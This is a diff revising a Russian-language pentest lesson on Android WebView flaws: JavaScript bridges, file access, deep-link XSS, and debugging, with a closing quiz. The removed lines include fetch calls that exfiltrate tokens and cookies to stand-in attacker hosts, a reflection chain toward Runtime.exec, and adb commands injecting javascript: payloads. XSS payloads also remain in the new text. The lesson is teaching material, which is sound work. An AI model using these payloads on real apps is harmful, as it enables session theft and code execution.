@@ -14,201 +14,208 @@ useful_for:
 estimated_minutes: 14
 summary: "Как Android WebView открывает сайты и локальные страницы, чем опасны addJavascriptInterface, setAllowFileAccess и file://, и как эксплуатировать XSS/загрузку произвольного URL в контексте приложения."
 ---
-## Что такое WebView и почему это опасно
 
-WebView — встроенный браузер внутри Android-приложения. Он умеет загружать веб-страницы, исполнять JavaScript и — что важно — обмениваться данными с нативным кодом через JS-интерфейсы (`addJavascriptInterface`). Если WebView загружает недоверенный контент или позволяет выполнить произвольный JS, последствия серьёзны: XSS, кража токенов, доступ к файлам, вызов нативных методов. WebView — одна из самых частых уязвимостей Android. Цель модуля — научиться их находить и эксплуатировать.
+## Вопрос, с которого всё начинается
 
-## Опасные настройки WebView
+Многие приложения показывают веб-контент прямо внутри себя — страницу оплаты, справку, вход через соцсеть. Для этого используется **WebView**, встроенный браузер. Но WebView — это не отдельное окно браузера: у него есть доступ к приложению через JavaScript-мосты. Ошибка в настройках превращает веб-страницу в способ выполнить код. Как это проверить?
 
-Ищите в коде:
+## Наш пример: WebView в lichess.apk
 
-- `setJavaScriptEnabled(true)` — без него XSS не сработает, с ним — опасно.
-- `addJavascriptInterface(obj, "name")` — даёт JS доступ к Java-объекту.
-- `setAllowFileAccess(true)` / `setAllowFileAccessFromFileURLs(true)` — чтение файлов.
-- `setAllowUniversalAccessFromFileURLs(true)` — запросы с file://.
-- `setWebContentsDebuggingEnabled(true)` — отладка через Chrome.
-- `loadUrl(userInput)` — загрузка произвольного URL.
+Возьмём `lichess.apk` и посмотрим, есть ли в нём WebView. Декомпилировать большой APK долго, но строки DEX покажут классы:
 
-```bash
-grep -rn 'addJavascriptInterface\|setJavaScriptEnabled\|loadUrl\|setAllowFile' app_java
+```
+$ unzip -o lichess.apk 'classes*.dex' -d lcx
+$ strings lcx/classes.dex | grep -iE 'WebView|loadUrl|setJavaScriptEnabled' | sort -u | head
+Landroid/webkit/WebView;
+Landroid/webkit/WebViewClient;
+loadUrl
+setJavaScriptEnabled
+setWebView
+setWebViewClient
 ```
 
-## XSS через WebView
+Вот и признаки: приложение создаёт WebView, включает JavaScript и загружает URL. Дальше вопрос — какие настройки включены и есть ли мост в нативный код.
 
-Если WebView загружает HTML с неэкранированным вводом, возможна XSS:
+## Шаг 1: что такое WebView и чем он опасен
 
-```javascript
-// если addJavascriptInterface добавлен под именем "app"
-app.method(...)   // вызов нативного метода из JS
+WebView — компонент `android.webkit.WebView`, который рендерит HTML/CSS/JS внутри приложения. Он опасен по трём причинам:
+
+- **JavaScript по умолчанию выключен**, но приложения его включают (`setJavaScriptEnabled(true)`) — и тогда любой XSS становится выполнимым.
+- **JavaScript-мосты** (`addJavascriptInterface`) дают JS-коду доступ к методам Java.
+- **Доступ к локальным файлам** (`file://`, `setAllowFileAccess`) может открыть приватные данные.
+
+## Шаг 2: опасные настройки
+
+Смотрим, что включено:
+
+```java
+webView.getSettings().setJavaScriptEnabled(true);
+webView.getSettings().setAllowFileAccess(true);
+webView.getSettings().setAllowFileAccessFromFileURLs(true);
+webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
+webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
 ```
 
-Пример эксплуатации: если WebView загружает `javascript:alert(1)` (например, через deep link), вы получаете выполнение JS. Если есть JS-интерфейс, вы можете вызвать нативные методы.
+Каждая строка добавляет риск:
 
-## Утечка токенов
+- `setAllowUniversalAccessFromFileURLs(true)` — страница из `file://` может читать другие `file://` (утечка файлов).
+- `setJavaScriptCanOpenWindowsAutomatically(true)` — открытие окон без участия пользователя.
+- Комбинация `setAllowFileAccess` + JS = доступ к приватным файлам приложения.
 
-WebView часто хранит сессию. Через XSS можно украсть токен:
+## Шаг 3: XSS через WebView
 
-```javascript
-fetch('https://attacker/?t=' + localStorage.getItem('token'))
+Если WebView грузит URL, куда попадает пользовательский ввод, возможен XSS. Например, приложение подставляет параметр deep link в адрес:
+
+```java
+webView.loadUrl("https://app.example.com/page?q=" + getIntent().getData().getQueryParameter("q"));
 ```
 
-Или прочитать cookies, если они доступны.
+Тогда ссылка `app://open?q=<script>...</script>` исполнит скрипт в контексте приложения. А если есть мост в Java — этот скрипт вызовет нативные методы.
 
-## addJavascriptInterface: RCE
+## Шаг 4: addJavascriptInterface — прямой RCE-класс
 
-Если через `addJavascriptInterface` доступен объект с опасными методами (например, `Runtime.exec`), можно достичь RCE:
+Самый опасный паттерн — регистрация Java-объекта, доступного из JS:
 
-```javascript
-app.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...)
+```java
+webView.addJavascriptInterface(new Bridge(), "Android");
 ```
 
-Даже если прямой доступ ограничен, рефлексия часто позволяет добраться до опасных вызовов.
+Теперь любой JS на странице вызывает `Android.someMethod()`. Если метод делает что-то привилегированное (читает файлы, отправляет данные), XSS превращается в выполнение кода/утечку. До Android 4.2 через `getClass()` можно было дойти до `Runtime.exec` — классический WebView RCE.
 
-## Загрузка произвольного URL
+## Шаг 5: загрузка произвольного URL
 
-Если deep link или intent передаёт URL в WebView без проверки, можно:
+Проверьте, может ли внешний ввод задать адрес:
 
-- загрузить фишинговую страницу;
-- загрузить `javascript:`-пейлоад;
-- загрузить `file://` (если разрешено) и прочитать локальные файлы.
-
-```bash
-adb shell am start -a android.intent.action.VIEW -d "myapp://web?url=javascript:alert(1)"
+```java
+webView.loadUrl(getIntent().getStringExtra("url"));
 ```
 
-## setWebContentsDebuggingEnabled
+Если да — приложение превращается в открытый редирект и может грузить фишинговые страницы, а через мост — звать нативные методы. Правильно — белый список доменов.
 
-Если включена отладка, можно подключиться к WebView через Chrome DevTools:
+## Шаг 6: отладка WebView
 
-```bash
-adb forward tcp:9222 localabstract:webview_devtools_remote_<pid>
-# открыть chrome://inspect
+Отдельная находка — включённая отладка WebView:
+
+```java
+WebView.setWebContentsDebuggingEnabled(true);
 ```
 
-Это позволяет исследовать содержимое WebView вручную.
+Тогда к WebView можно подключиться через `chrome://inspect` и выполнять JS в контексте приложения. В release-сборке это должно быть выключено.
 
-## Защита и её обход
+## Шаг 7: защита и её обход
 
-Правильная защита: не включать JavaScript без нужды, не добавлять JS-интерфейсы, проверять URL по whitelist, экранировать вывод. Обход: ищите непроверенные параметры, `javascript:`-схему, доступ к нативным методам через рефлексию.
+Безопасные настройки:
 
-## Типичные ошибки и подводные камни
+- JS включать только при необходимости; грузить только доверенный контент.
+- Не использовать `addJavascriptInterface`; вместо него — `WebViewCompat.postWebMessage`.
+- Отключить `setAllowFileAccess`, `setAllowUniversalAccessFromFileURLs`.
+- Белый список доменов в `shouldOverrideUrlLoading`.
+- Выключить `setWebContentsDebuggingEnabled` в release.
 
-- **Игнорировать `addJavascriptInterface`** — это прямой мост в нативный код.
-- **Забыть про `file://`** — чтение локальных файлов.
-- **Не проверить deep link в WebView** — инъекция URL.
-- **Полагать, что XSS в WebView безвреден** — он даёт доступ к нативным методам.
-- **Не включить отладку** — теряете удобный инструмент.
-- **Забыть про JS-мост** — именно он превращает XSS в RCE.
+Обход защиты обычно идёт через **нестрогую валидацию URL** (`startsWith`, подстрока) — см. урок про deep links.
 
-## Справочная таблица
+## Чем XSS в WebView отличается от веб-XSS
 
-| Настройка | Риск |
-|-----------|------|
-| `addJavascriptInterface` | JS→Java, возможен RCE |
-| `setJavaScriptEnabled` | XSS |
-| `setAllowFileAccess` | чтение файлов |
-| `loadUrl(userInput)` | инъекция URL |
-| `setWebContentsDebuggingEnabled` | отладка |
+В обычном веб-приложении XSS ограничен «миром браузера»: cookie, DOM, запросы. В WebView тот же XSS получает **мост в приложение**. Если разработчик зарегистрировал Java-объект через `addJavascriptInterface`, скрипт из веб-страницы вызывает нативные методы так же свободно, как JavaScript вызывает функции. Это стирает границу между «веб-уязвимостью» и «выполнением кода в приложении».
 
-## Что дальше / решение
+Именно поэтому WebView-XSS считается гораздо серьёзнее: то, что на сайте было бы отражённым XSS средней важности, внутри приложения превращается в кражу токенов, чтение файлов и выполнение команд. Пентестер должен всегда проверять, есть ли мост, прежде чем оценивать severity.
 
-План: найдите WebView-код и опасные настройки, проверьте, откуда берётся URL/HTML, подставьте `javascript:` и внешний URL, проверьте доступные JS-интерфейсы и рефлексию. Если включена отладка — подключитесь через Chrome DevTools. WebView — частая и серьёзная уязвимость, потому что JS-мост связывает веб-контент с нативным кодом.
+## Разбор реального сценария
 
-## Практический пример: XSS через WebView в RCE
+Приложение открывает страницу справки, подставляя параметр в URL:
 
-Разберём сквозной сценарий. В коде находим `webView.addJavascriptInterface(new Bridge(), "bridge")` и `webView.loadUrl(getIntent().getStringExtra("url"))`. Шаг 1: понимаем, что URL берётся из intent — значит, можно передать произвольный. Шаг 2: запускаем: `adb shell am start -n com.example.app/.WebActivity -e "url" "javascript:bridge.getFlag()"`. Шаг 3: если метод возвращает флаг, он появится в UI или в логе. Шаг 4: если прямой доступ к опасным методам закрыт, используем рефлексию: `javascript:bridge.getClass().forName('java.lang.Runtime')...` — путь к RCE.
-
-Ключевая мысль: `addJavascriptInterface` — это мост из веб-мира в нативный. Любая инъекция JS (через URL, HTML, редирект) превращается в вызов нативного кода. Даже «безобидный» интерфейс с одним методом может стать точкой входа.
-
-## Практический пример: кража токена
-
-Если WebView загружает страницу с XSS, можно украсть сессию:
-
-```javascript
-fetch('https://attacker.example/?t=' + btoa(document.cookie))
+```java
+webView.loadUrl("https://app.example.com/help?topic=" + getIntent().getStringExtra("topic"));
 ```
 
-Или прочитать `localStorage`, где приложение хранит JWT. Это классическая утечка через WebView, которая на сервере выглядит как обычный запрос.
-
-## Проверка настроек и отладки
-
-Пройдитесь по коду и найдите все опасные флаги (`setAllowFileAccess`, `setAllowUniversalAccessFromFileURLs`, `setWebContentsDebuggingEnabled`). Если включена отладка — подключитесь через `adb forward` и `chrome://inspect`, чтобы увидеть содержимое WebView и выполнять JS вручную. Это самый быстрый способ понять, что загружается.
+Deep link `app://help?topic=<img src=x onerror=Android.steal()>` исполняет скрипт. Если есть мост `Android.steal()`, который отправляет данные на сервер, токен сессии утекает. Цепочка: deep link → XSS в WebView → вызов моста → кража. Каждое звено по отдельности может выглядеть безобидно, но вместе они дают полный захват аккаунта.
 
 ## Частые вопросы
 
-«JS не выполняется?» — `setJavaScriptEnabled(false)` или CSP. «Не знаю имя JS-интерфейса?» — ищите `addJavascriptInterface` в коде. «URL не берётся из intent?» — ищите другие источники (`loadData`, редирект). «Как читать файлы?» — `file://` при `setAllowFileAccess`. «Что если CSP?» — ищите обход или другой вектор.
+**«JavaScript по умолчанию включён?»** — нет, но приложения его включают. **«Что опаснее: file:// или мост?»** — мост, потому что даёт доступ к нативному коду. **«Как найти мост?»** — grep по `addJavascriptInterface`. **«Нужен ли root?»** — нет, достаточно заставить приложение открыть ваш URL. **«Как защитить?»** — белый список доменов, `WebMessage` вместо моста, отключение файлового доступа.
 
-## Что дальше / решение
+## Практический совет
 
-Итог: найдите WebView-код, опасные настройки и источники URL/HTML; подставьте `javascript:` и внешний URL; изучите JS-интерфейсы и рефлексию. Включите отладку для ручного анализа. WebView — частая и серьёзная уязвимость: JS-мост связывает веб-контент с нативным кодом, превращая XSS в кражу данных или RCE.
+Проверяйте WebView в два шага. Сначала настройки: JS, файловый доступ, отладка. Потом — источники URL: может ли внешний ввод задать адрес или его часть. Именно сочетание «опасная настройка + контролируемый URL» даёт рабочую уязвимость. Не забывайте и про отладочный WebView: если `setWebContentsDebuggingEnabled(true)` включён в release, вы можете выполнить JS прямо из `chrome://inspect`.
 
-## Расширенный чек-лист по WebView
+## Полный прогон от начала до конца
 
-Порядок. Первое: найдите WebView-код и все опасные настройки (`addJavascriptInterface`, `setJavaScriptEnabled`, `setAllowFileAccess`, `setAllowUniversalAccessFromFileURLs`, `setWebContentsDebuggingEnabled`). Второе: определите, откуда берётся URL/HTML — из intent, deep link, сети, локального файла. Третье: если источник контролируемый — подставьте `javascript:alert(1)` и внешний URL. Четвёртое: изучите JS-интерфейсы — какие методы доступны и есть ли путь к рефлексии/RCE. Пятое: если включена отладка — подключитесь через `adb forward` и `chrome://inspect`. Шестое: проверьте `file://`-доступ и чтение локальных файлов. Седьмое: проверьте CSP и другие ограничения.
+Соберём проверку WebView в один сценарий. Сначала находим WebView в коде: `grep -rn "WebView" out/` и смотрим, какие настройки включаются рядом. Затем проверяем, есть ли `addJavascriptInterface` — если да, выписываем методы моста. Дальше ищем, откуда берётся URL для `loadUrl`: константа (безопасно), ресурс приложения (безопасно), внешний ввод (опасно). Если URL контролируется снаружи, строим страницу с XSS и смотрим, выполняется ли она. Наконец проверяем `setWebContentsDebuggingEnabled`. Итог — либо подтверждённая цепочка, либо список замечаний по конфигурации.
 
-## Что делает WebView опасным
+## Ещё один вектор: доступ к `content://`
 
-Сама по себе загрузка веб-страницы не опасна. Опасность возникает в комбинации: включённый JavaScript + контролируемый источник контента + JS-мост или доступ к файлам. Именно эта комбинация превращает «просто браузер» в вектор RCE и утечки данных. Поэтому при анализе ищите именно такие сочетания.
+WebView может грузить не только `file://` и `https://`, но и `content://`. Если настройки разрешают, а приложение само выдаёт себе доступ к своим провайдерам, страница может прочитать данные через `content://`. Это особенно опасно в связке с `grantUriPermissions`: WebView получает грант и читает файлы, которые не должны быть доступны вебу. Проверяйте `shouldOverrideUrlLoading` — фильтрует ли он схемы `file` и `content`, или пропускает всё.
 
-## Частые вопросы
+## Что мы теперь знаем
 
-«JS не исполняется?» — `setJavaScriptEnabled(false)` или CSP. «Не знаю имя моста?» — `addJavascriptInterface` в коде. «Как читать файлы?» — `file://` при `setAllowFileAccess`. «Нет отладки?» — включите через патч или используйте Frida. «URL не из intent?» — ищите `loadData`/редиректы.
+По-простому:
 
-## Что дальше / решение
+1. WebView — встроенный браузер с доступом к приложению.
+2. JS включают явно; вместе с XSS это уже опасно.
+3. `addJavascriptInterface` даёт JS доступ к Java — прямой путь к RCE.
+4. Доступ к `file://` и произвольный URL — источники утечек.
+5. Защита: белый список, WebMessage вместо моста, отключение файлового доступа.
 
-Итог: WebView опасен комбинацией «JS + контролируемый контент + мост/файлы». Находите настройки, источники контента и JS-интерфейсы, подставляйте `javascript:` и внешние URL, используйте отладку. WebView — частая и серьёзная уязвимость Android, часто ведущая к краже токенов или RCE.
+## На что смотреть дальше
 
-## Итог по WebView
+- **Ищите `setJavaScriptEnabled`** и другие опасные настройки.
+- **Ищите `addJavascriptInterface`** — самый серьёзный паттерн.
+- **Проверяйте, откуда берётся URL** для `loadUrl`.
+- **Смотрите `setWebContentsDebuggingEnabled`** — отладка в release.
 
-Ищите комбинацию «JS + контролируемый контент + мост/файлы». Подставляйте `javascript:` и внешние URL, изучайте JS-интерфейсы, используйте отладку. WebView часто ведёт к краже токенов или RCE.
+## Отладка и инспекция
 
-## Итог по WebView
-
-Ключевое — комбинация «JS + контролируемый контент + мост/файлы». Проверьте настройки, источники и JS-интерфейсы; используйте отладку. WebView часто ведёт к краже токенов или RCE.
+Если WebView в release-сборке оставили с включённой отладкой, вы можете подключиться к нему из Chrome по `chrome://inspect`, увидеть DOM и выполнить произвольный JavaScript в контексте приложения. Это делает ненужной всю работу по достижению XSS: вы уже внутри. Поэтому проверка `setWebContentsDebuggingEnabled` — обязательный шаг, а находка «отладка включена в release» фиксируется отдельно.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Почему XSS в Android WebView опаснее обычного XSS в браузере?"
+- question: "Что такое WebView?"
   options:
-    - "Он даёт JS доступ к нативным функциям приложения через `addJavascriptInterface`"
-    - "Он быстрее"
-    - "Он не требует JavaScript"
-    - "Он обходит HTTPS"
+    - "Встроенный в приложение браузер"
+    - "База данных"
+    - "Нативная библиотека"
+    - "Тип сертификата"
   answer: 0
-- question: "Какой метод делает нативные методы доступными из JavaScript?"
+- question: "Почему `addJavascriptInterface` опасен?"
   options:
-    - "`setJavaScriptEnabled`"
-    - "`loadUrl`"
-    - "`addJavascriptInterface`"
-    - "`shouldOverrideUrlLoading`"
-  answer: 2
-- question: "Что позволяет `setAllowFileAccess(true)` вместе с `file://`?"
-  options:
-    - "Читать локальные файлы приложения из веб-контекста"
-    - "Ускорять загрузку"
-    - "Включать HTTPS"
-    - "Отключать JavaScript"
+    - "Даёт JS-коду доступ к методам Java, вплоть до RCE"
+    - "Замедляет загрузку"
+    - "Требует root"
+    - "Шифрует трафик"
   answer: 0
-- question: "Если WebView грузит URL из deep link без проверки домена — это…"
+- question: "Какая настройка открывает доступ к локальным файлам из `file://`?"
   options:
-    - "Загрузка произвольного URL (фишинг, XSS, доступ к мосту)"
-    - "Нормальное поведение"
-    - "Защита от MITM"
-    - "Обязательное требование Android"
+    - "setAllowUniversalAccessFromFileURLs(true)"
+    - "setJavaScriptEnabled(true)"
+    - "setSupportZoom(true)"
+    - "setBuiltInZoomControls(true)"
   answer: 0
-- question: "Каким хуком удобно логировать загрузку URL в WebView через Frida?"
+- question: "Что включает отладку WebView через chrome://inspect?"
   options:
-    - "Перехватить `WebView.loadUrl`"
-    - "Перехватить `Content-Type`"
-    - "Перехватить `sqlite3`"
-    - "Перехватить `ptrace`"
+    - "WebView.setWebContentsDebuggingEnabled(true)"
+    - "setJavaScriptEnabled(true)"
+    - "loadUrl()"
+    - "setWebViewClient()"
+  answer: 0
+- question: "Как правильно ограничить загружаемые URL?"
+  options:
+    - "Белым списком доменов в shouldOverrideUrlLoading"
+    - "Проверкой startsWith по подстроке"
+    - "Отключением JavaScript"
+    - "Использованием HTTPS"
   answer: 0
 ```
 
+## Куда дальше
+
+Мы разобрали базовые опасности WebView. В следующем уроке — **кросс-платформенные фреймворки**: Cordova, React Native, Flutter, и как их структура меняет подход к анализу. А пока запомни главное: WebView — это мост между вебом и приложением, и его настройки решают, будет ли этот мост безопасным.
+
 ## Где пригодится
 
-- **CTF Mobile:** XSS в WebView → вызов JS-моста → флаг/токен.
-- **Bug bounty:** кража сессий/токенов через WebView, утечка через `file://`, account takeover.
-- **Пентест:** проверка OWASP MASVS-PLATFORM (WebView-безопасность).
-- **Работа:** рекомендации по безопасной настройке WebView (отключить file access, валидировать домены, минимизировать мосты).
+- **CTF Mobile:** XSS в WebView → выполнение кода.
+- **Bug bounty:** мост JS→Java — серьёзная находка.
+- **Пентест:** проверка OWASP MASVS-PLATFORM.
+- **Работа:** ревью встроенного браузера и его настроек.
